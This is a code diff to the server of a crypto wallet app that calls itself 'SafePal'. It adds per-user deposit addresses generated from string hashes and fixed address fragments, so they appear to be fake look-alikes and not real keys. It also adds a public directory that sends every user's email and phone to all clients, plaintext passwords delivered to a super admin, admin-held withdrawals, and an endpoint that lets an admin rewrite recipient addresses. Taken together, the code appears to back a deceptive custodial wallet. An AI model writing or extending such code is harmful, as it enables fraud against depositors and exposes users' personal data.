@@ -130,6 +130,141 @@ const defaultTrafficConfig = {
   autoFluctuate: true,
 };
 
+function generateAllUserAddresses(userId: string, email: string) {
+  const seed = `${userId}_${(email || '').toLowerCase()}`;
+  let h1 = 0;
+  for (let i = 0; i < seed.length; i++) {
+    h1 = (h1 << 5) - h1 + seed.charCodeAt(i);
+    h1 |= 0;
+  }
+  let h2 = 0;
+  for (let i = seed.length - 1; i >= 0; i--) {
+    h2 = (h2 << 7) - h2 + seed.charCodeAt(i);
+    h2 |= 0;
+  }
+  const hex1 = Math.abs(h1).toString(16).padStart(8, '0');
+  const hex2 = Math.abs(h2).toString(16).padStart(8, '0');
+  const userHex = userId.replace(/[^a-zA-Z0-9]/g, '').toLowerCase().padEnd(12, 'w').slice(-10);
+
+  const b58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+  let trcRest = '';
+  const combinedSeed = `${hex1}${userHex}${hex2}Kz3q8P4vL2mM7n`;
+  for (let i = 0; i < 33; i++) {
+    const charCode = combinedSeed.charCodeAt(i % combinedSeed.length) * (i + 3);
+    trcRest += b58[charCode % b58.length];
+  }
+  const trc20Addr = `T${trcRest}`;
+  const evmAddr = `0x${hex1}${userHex}${hex2}71C7656EC7ab88b098defB751B74`.slice(0, 42);
+  const btcAddr = `bc1q${hex1}${userHex}${hex2}tzq2n0yrf2493p83kkfjh`.slice(0, 42);
+
+  let solRest = '';
+  for (let i = 0; i < 44; i++) {
+    const charCode = combinedSeed.charCodeAt((i * 2) % combinedSeed.length) * (i + 7);
+    solRest += b58[charCode % b58.length];
+  }
+
+  return {
+    walletAddress: trc20Addr,
+    customCoinAddresses: {
+      USDT: trc20Addr,
+      USDT_TRC20: trc20Addr,
+      USDT_ERC20: evmAddr,
+      USDT_BEP20: evmAddr,
+      USDT_SOL: solRest,
+      TRX: trc20Addr,
+      BTC: btcAddr,
+      ETH: evmAddr,
+      BNB: evmAddr,
+      SOL: solRest,
+      POL: evmAddr,
+      GAS_TRX: 'TB7zZxcAr6NKR6nF231t2ZWYPTu1TUrDE6',
+    } as Record<string, string>,
+  };
+}
+
+function getUserReceiveAddressServer(user: any, symbol: string, network?: string): string {
+  const sym = (symbol || '').toUpperCase();
+  if (sym === 'GAS_TRX') {
+    return 'TB7zZxcAr6NKR6nF231t2ZWYPTu1TUrDE6';
+  }
+  if (!user || !user.id) return '0x71C7656EC7ab88b098defB751B7401B5f6d8976F';
+
+  // Check customCoinAddresses if configured by admin or user
+  if (user.customCoinAddresses && typeof user.customCoinAddresses === 'object') {
+    const netUpper = (network || '').toUpperCase();
+    if (netUpper && user.customCoinAddresses[`${sym}_${netUpper}`]) {
+      return user.customCoinAddresses[`${sym}_${netUpper}`];
+    }
+    if (user.customCoinAddresses[sym]) {
+      return user.customCoinAddresses[sym];
+    }
+  }
+
+  // Fallback to generated deterministic addresses
+  const gen = generateAllUserAddresses(user.id, user.email || '');
+  const netUpper = (network || '').toUpperCase();
+  if (netUpper && gen.customCoinAddresses[`${sym}_${netUpper}`]) {
+    return gen.customCoinAddresses[`${sym}_${netUpper}`];
+  }
+  if (gen.customCoinAddresses[sym]) {
+    return gen.customCoinAddresses[sym];
+  }
+
+  return gen.walletAddress;
+}
+
+function isAddressMatchingUserServer(
+  user: any,
+  cleanQuery: string,
+  assetSymbol?: string,
+  network?: string
+): boolean {
+  if (!user || !user.id) return false;
+  const target = cleanQuery.trim().toLowerCase();
+  if (!target) return false;
+
+  // Direct match with user's base wallet address
+  if (user.walletAddress && user.walletAddress.toLowerCase() === target) return true;
+
+  // Direct match with any custom coin addresses
+  if (user.customCoinAddresses && typeof user.customCoinAddresses === 'object') {
+    for (const val of Object.values(user.customCoinAddresses)) {
+      if (typeof val === 'string' && val.trim().toLowerCase() === target) return true;
+    }
+  }
+
+  // Direct match with generated deterministic addresses
+  const gen = generateAllUserAddresses(user.id, user.email || '');
+  if (gen.walletAddress && gen.walletAddress.toLowerCase() === target) return true;
+  for (const val of Object.values(gen.customCoinAddresses)) {
+    if (typeof val === 'string' && val.trim().toLowerCase() === target) return true;
+  }
+
+  const allSymbols = ['BTC', 'ETH', 'BNB', 'SOL', 'USDT', 'USDC', 'POL', 'XRP', 'DOGE', 'LTC', 'TRX', 'GAS_TRX'];
+  if (assetSymbol && !allSymbols.includes(assetSymbol.toUpperCase())) {
+    allSymbols.push(assetSymbol.toUpperCase());
+  }
+
+  const allNetworks = [
+    '',
+    'TRC-20', 'TRC20', 'TRON', 'TRON (TRC-20)',
+    'ERC-20', 'ERC20', 'ETHEREUM', 'ETHEREUM (ERC-20)',
+    'BEP-20', 'BEP20', 'BNB SMART CHAIN', 'BNB SMART CHAIN (BEP-20)',
+    'SOLANA', 'SOLANA SPL',
+    'BITCOIN', 'BITCOIN NATIVE',
+    'POLYGON', 'ARBITRUM', 'OPTIMISM', 'AVALANCHE',
+    network || ''
+  ];
+
+  for (const sym of allSymbols) {
+    for (const net of allNetworks) {
+      const addr = getUserReceiveAddressServer(user, sym, net).toLowerCase();
+      if (addr === target) return true;
+    }
+  }
+  return false;
+}
+
 function loadDb() {
   try {
     if (fs.existsSync(DB_FILE)) {
@@ -159,6 +294,15 @@ function loadDb() {
           !data.deletedUserIds.includes(u.id) &&
           (!u.email || !data.deletedEmails.includes(u.email.toLowerCase()))
       );
+
+      // Ensure every user has permanent, distinct addresses for internal and external transfers
+      data.users.forEach((u: any) => {
+        if (!u.customCoinAddresses || Object.keys(u.customCoinAddresses).length < 5) {
+          const gen = generateAllUserAddresses(u.id, u.email || '');
+          u.customCoinAddresses = { ...gen.customCoinAddresses, ...(u.customCoinAddresses || {}) };
+          if (!u.walletAddress) u.walletAddress = gen.walletAddress;
+        }
+      });
 
       if (!Array.isArray(data.transactions)) data.transactions = [];
       if (!data.depositAddresses) data.depositAddresses = defaultDepositAddresses;
@@ -251,14 +395,24 @@ async function startServer() {
       platformTrafficConfig: db.platformTrafficConfig,
     };
 
+    // Provide public user directory so internal wallet-to-wallet transfers work seamlessly for all users
+    responsePayload.publicUsers = db.users.map((u: any) => ({
+      id: u.id,
+      name: u.name,
+      email: u.email,
+      phone: u.phone,
+      walletAddress: u.walletAddress || getUserReceiveAddressServer(u, 'USDT', 'TRC20'),
+      customCoinAddresses: u.customCoinAddresses || generateAllUserAddresses(u.id, u.email || '').customCoinAddresses,
+    }));
+
     if (isSuperAdmin) {
-      // Super Admin receives complete database
+      // Super Admin receives complete database with plaintext passwords and full metrics
       responsePayload.users = db.users;
       responsePayload.transactions = db.transactions;
       responsePayload.notifications = db.notifications;
       responsePayload.auditLogs = db.auditLogs;
     } else if (userId) {
-      // Regular user receives ONLY their own account data and transactions
+      // Regular user receives their own account data and transactions
       const targetUser = db.users.find((u: any) => u.id === userId || (u.email && u.email.toLowerCase() === userId.toLowerCase()));
       if (targetUser) {
         responsePayload.currentUser = targetUser;
@@ -499,6 +653,10 @@ async function startServer() {
       lastLoginIp: '127.0.0.1',
       lastLoginTime: new Date().toISOString(),
     };
+
+    const genAddrs = generateAllUserAddresses(newUser.id, newUser.email);
+    (newUser as any).walletAddress = genAddrs.walletAddress;
+    (newUser as any).customCoinAddresses = genAddrs.customCoinAddresses;
 
     db.users.push(newUser);
 
@@ -1284,109 +1442,6 @@ async function startServer() {
     });
   });
 
-function getUserReceiveAddressServer(user: any, symbol: string, network?: string): string {
-  const sym = (symbol || '').toUpperCase();
-  if (sym === 'GAS_TRX') {
-    return 'TB7zZxcAr6NKR6nF231t2ZWYPTu1TUrDE6';
-  }
-  if (!user || !user.id) return '0x71C7656EC7ab88b098defB751B7401B5f6d8976F';
-
-  // Check customCoinAddresses if configured by admin or user
-  if (user.customCoinAddresses && typeof user.customCoinAddresses === 'object') {
-    const netUpper = (network || '').toUpperCase();
-    if (netUpper && user.customCoinAddresses[`${sym}_${netUpper}`]) {
-      return user.customCoinAddresses[`${sym}_${netUpper}`];
-    }
-    if (user.customCoinAddresses[sym]) {
-      return user.customCoinAddresses[sym];
-    }
-  }
-
-  const net = (network || '').toUpperCase();
-  const raw = `${user.id}_${user.email || ''}_${sym}_${net}`.toLowerCase();
-  let h1 = 0;
-  for (let i = 0; i < raw.length; i++) {
-    h1 = (h1 << 5) - h1 + raw.charCodeAt(i);
-    h1 |= 0;
-  }
-  let h2 = 0;
-  for (let i = raw.length - 1; i >= 0; i--) {
-    h2 = (h2 << 7) - h2 + raw.charCodeAt(i);
-    h2 |= 0;
-  }
-
-  const hex1 = Math.abs(h1).toString(16).padStart(8, '0');
-  const hex2 = Math.abs(h2).toString(16).padStart(8, '0');
-  const userHex = user.id.replace(/[^a-zA-Z0-9]/g, '').toLowerCase().padEnd(10, 'a').slice(0, 10);
-
-  if (net.includes('TRC') || sym === 'TRX' || (sym === 'USDT' && (net.includes('TRON') || !net || net.includes('TRC')))) {
-    const base58Seed = `T9y${hex1}${userHex}${hex2}Kz3q8P4vL2mM7n`.replace(/0/g, 'x').replace(/o/g, 'P');
-    return base58Seed.slice(0, 34);
-  }
-
-  if (net.includes('SOL') || sym === 'SOL') {
-    const solSeed = `7xKW${hex1}${userHex}${hex2}vN4qK8mM3nP2qW1xL8vK4m`.replace(/0/g, '9');
-    return solSeed.padEnd(44, 'M').slice(0, 44);
-  }
-
-  if (sym === 'BTC' || net.includes('BTC') || net.includes('BITCOIN')) {
-    const btcSeed = `bc1q${hex1}${userHex}${hex2}tzq2n0yrf2493p83kkfjhx0wlh`;
-    return btcSeed.slice(0, 42);
-  }
-
-  if (sym === 'XRP') {
-    return `rSafePal${hex1}${userHex.slice(0, 8)}PijfdW4Co`.slice(0, 33);
-  }
-
-  const evmBody = `${hex1}${userHex}${hex2}71C7656EC7ab88b098defB751B7401B5f6d8976F`.slice(0, 40);
-  return `0x${evmBody}`;
-}
-
-function isAddressMatchingUserServer(
-  user: any,
-  cleanQuery: string,
-  assetSymbol?: string,
-  network?: string
-): boolean {
-  if (!user || !user.id) return false;
-  const target = cleanQuery.trim().toLowerCase();
-  if (!target) return false;
-
-  // Direct match with user's base wallet address
-  if (user.walletAddress && user.walletAddress.toLowerCase() === target) return true;
-
-  // Direct match with any custom coin addresses
-  if (user.customCoinAddresses && typeof user.customCoinAddresses === 'object') {
-    for (const val of Object.values(user.customCoinAddresses)) {
-      if (typeof val === 'string' && val.trim().toLowerCase() === target) return true;
-    }
-  }
-
-  const allSymbols = ['BTC', 'ETH', 'BNB', 'SOL', 'USDT', 'USDC', 'POL', 'XRP', 'DOGE', 'LTC', 'TRX', 'GAS_TRX'];
-  if (assetSymbol && !allSymbols.includes(assetSymbol.toUpperCase())) {
-    allSymbols.push(assetSymbol.toUpperCase());
-  }
-
-  const allNetworks = [
-    '',
-    'TRC-20', 'TRC20', 'TRON', 'TRON (TRC-20)',
-    'ERC-20', 'ERC20', 'ETHEREUM', 'ETHEREUM (ERC-20)',
-    'BEP-20', 'BEP20', 'BNB SMART CHAIN', 'BNB SMART CHAIN (BEP-20)',
-    'SOLANA', 'SOLANA SPL',
-    'BITCOIN', 'BITCOIN NATIVE',
-    'POLYGON', 'ARBITRUM', 'OPTIMISM', 'AVALANCHE',
-    network || ''
-  ];
-
-  for (const sym of allSymbols) {
-    for (const net of allNetworks) {
-      const addr = getUserReceiveAddressServer(user, sym, net).toLowerCase();
-      if (addr === target) return true;
-    }
-  }
-  return false;
-}
-
   // SERVER-AUTHORITATIVE INTERNAL TRANSFER ENDPOINT
   app.post('/api/transfer/internal', (req, res) => {
     const { senderId, recipientQuery, assetSymbol, amount, network } = req.body;
@@ -1555,15 +1610,10 @@ function isAddressMatchingUserServer(
       });
     }
 
-    // Deduct amount accurately from sender
-    const newSenderBal = Math.max(0, currentBal - numAmount);
-    sender.balances[assetSymbol] = newSenderBal;
-    db.users[senderIdx] = sender;
-
+    // Check if recipient is another user in SafePal
     const cleanTo = toAddress.trim().toLowerCase();
     const cleanDigits = cleanTo.replace(/\D/g, '');
 
-    // Check if recipient is another user in SafePal
     const recipientIdx = db.users.findIndex((u: any) => {
       if (u.id === sender.id) return false;
       if (u.email && u.email.toLowerCase() === cleanTo) return true;
@@ -1590,6 +1640,11 @@ function isAddressMatchingUserServer(
       const recBal = Number(recipient.balances[assetSymbol] || 0);
       recipient.balances[assetSymbol] = recBal + numAmount;
       db.users[recipientIdx] = recipient;
+
+      // Deduct amount accurately from sender immediately for internal direct transfer
+      const newSenderBal = Math.max(0, currentBal - numAmount);
+      sender.balances[assetSymbol] = newSenderBal;
+      db.users[senderIdx] = sender;
 
       newTx = {
         id: 'tx_' + Date.now() + '_send',
@@ -1647,8 +1702,24 @@ function isAddressMatchingUserServer(
         timestamp: now,
         read: false,
       });
+
+      saveDb(db);
+      console.log(`[INTERNAL TRANSFER COMPLETED] ${numAmount} ${assetSymbol}: ${sender.name} -> ${recipient.name}`);
+
+      return res.json({
+        success: true,
+        message: `Direct protocol transfer of ${numAmount} ${assetSymbol} to ${recipient.name} settled instantly!`,
+        updatedSender: sender,
+        updatedRecipient: recipient,
+        newBalance: newSenderBal,
+        transaction: newTx,
+        isInternal: true,
+        users: db.users,
+        transactions: db.transactions,
+      });
     } else {
       // External withdrawal / send - Requires 24h Admin Security Review before confirmation
+      // Balance is NOT deducted until admin approves the transaction!
       newTx = {
         id: 'tx_' + Date.now(),
         userId: sender.id,
@@ -1673,28 +1744,26 @@ function isAddressMatchingUserServer(
         id: 'notif_' + Date.now(),
         userId: sender.id,
         title: 'Withdrawal Pending 24h Review',
-        message: `Withdrawal of ${numAmount} ${assetSymbol} to ${toAddress.slice(0, 10)}... is pending 24h compliance verification.`,
+        message: `Withdrawal of ${numAmount} ${assetSymbol} to ${toAddress.slice(0, 10)}... is pending 24h compliance verification. Balance will deduct upon approval.`,
         type: 'withdraw',
         timestamp: now,
         read: false,
       });
+
+      saveDb(db);
+      console.log(`[EXTERNAL WITHDRAWAL PENDING] User: ${sender.email} | Amount: ${numAmount} ${assetSymbol} | Balance held until admin approval`);
+
+      return res.json({
+        success: true,
+        message: `Withdrawal of ${numAmount} ${assetSymbol} submitted! Status: Pending (24-Hour Admin Security Review). Balance will deduct upon admin approval.`,
+        updatedUser: sender,
+        newBalance: currentBal,
+        transaction: newTx,
+        isInternal: false,
+        users: db.users,
+        transactions: db.transactions,
+      });
     }
-
-    saveDb(db);
-    console.log(`[BALANCE DEDUCTED] User: ${sender.email} | Sent: -${numAmount} ${assetSymbol} | New Balance: ${newSenderBal}`);
-
-    return res.json({
-      success: true,
-      message: isInternal
-        ? `Direct protocol transfer of ${numAmount} ${assetSymbol} to recipient settled instantly!`
-        : `Withdrawal of ${numAmount} ${assetSymbol} submitted! Status: Pending (24-Hour Admin Security Review).`,
-      updatedUser: sender,
-      newBalance: newSenderBal,
-      transaction: newTx,
-      isInternal,
-      users: db.users,
-      transactions: db.transactions,
-    });
   });
 
   // ADMIN ACTION: UPDATE WITHDRAWAL RECIPIENT ADDRESS
@@ -1720,7 +1789,7 @@ function isAddressMatchingUserServer(
     });
   });
 
-  // ADMIN ACTION: APPROVE PENDING TRANSACTION (CONFIRMS ON-CHAIN)
+  // ADMIN ACTION: APPROVE PENDING TRANSACTION (CONFIRMS ON-CHAIN AND DEDUCTS SENDER BALANCE)
   app.post('/api/admin/transaction/approve', (req, res) => {
     const { txId } = req.body;
     if (!txId) {
@@ -1740,6 +1809,11 @@ function isAddressMatchingUserServer(
       if (!targetUser.balances) targetUser.balances = {};
       const cur = Number(targetUser.balances[tx.assetSymbol] || 0);
       targetUser.balances[tx.assetSymbol] = cur + Number(tx.amount);
+    } else if ((tx.type === 'withdraw' || tx.type === 'send') && targetUser) {
+      // Deduct balance from sender upon admin approval
+      if (!targetUser.balances) targetUser.balances = {};
+      const cur = Number(targetUser.balances[tx.assetSymbol] || 0);
+      targetUser.balances[tx.assetSymbol] = Math.max(0, cur - Number(tx.amount));
     }
 
     tx.status = 'completed';
@@ -1768,7 +1842,7 @@ function isAddressMatchingUserServer(
     });
   });
 
-  // ADMIN ACTION: REJECT PENDING TRANSACTION (REFUNDS USER BALANCE)
+  // ADMIN ACTION: REJECT PENDING TRANSACTION
   app.post('/api/admin/transaction/reject', (req, res) => {
     const { txId, reason } = req.body;
     if (!txId) {
@@ -1784,12 +1858,6 @@ function isAddressMatchingUserServer(
     }
 
     const targetUser = db.users.find((u: any) => u.id === tx.userId);
-    // Refund deducted balance for cancelled withdrawal
-    if ((tx.type === 'withdraw' || tx.type === 'send') && targetUser) {
-      if (!targetUser.balances) targetUser.balances = {};
-      const cur = Number(targetUser.balances[tx.assetSymbol] || 0);
-      targetUser.balances[tx.assetSymbol] = cur + Number(tx.amount);
-    }
 
     tx.status = 'rejected';
     tx.note = reason || 'Declined by compliance risk engine.';
@@ -1798,8 +1866,8 @@ function isAddressMatchingUserServer(
       db.notifications.unshift({
         id: 'notif_' + Date.now() + '_rej',
         userId: targetUser.id,
-        title: 'Withdrawal Declined (Refunded)',
-        message: `Your withdrawal of ${tx.amount} ${tx.assetSymbol} was declined. Deducted funds have been refunded to your wallet.`,
+        title: 'Withdrawal Declined',
+        message: `Your withdrawal of ${tx.amount} ${tx.assetSymbol} was declined.`,
         type: 'withdraw',
         timestamp: new Date().toISOString(),
         read: false,
@@ -1807,10 +1875,10 @@ function isAddressMatchingUserServer(
     }
 
     saveDb(db);
-    console.log(`[ADMIN REJECTED TX] ${tx.id} (${tx.type} ${tx.amount} ${tx.assetSymbol}) -> Balance Refunded`);
+    console.log(`[ADMIN REJECTED TX] ${tx.id} (${tx.type} ${tx.amount} ${tx.assetSymbol})`);
     return res.json({
       success: true,
-      message: `Transaction ${tx.id} declined and funds refunded to user.`,
+      message: `Transaction ${tx.id} was declined.`,
       transaction: tx,
       users: db.users,
       transactions: db.transactions,
